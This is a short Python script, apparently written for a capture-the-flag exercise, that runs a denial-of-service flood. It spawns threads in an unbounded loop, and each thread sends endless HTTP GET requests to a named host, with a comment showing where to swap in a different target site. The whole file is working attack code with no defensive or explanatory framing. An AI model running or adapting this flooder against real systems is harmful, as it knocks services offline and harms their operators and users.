import threading
import requests

def dos():
 while True:
  print('nice!')
  requests.get('http://ctf06.root-me.org/')   # <== site name

  
while True:
 print('Good!')
 threading.Thread(target=dos).start()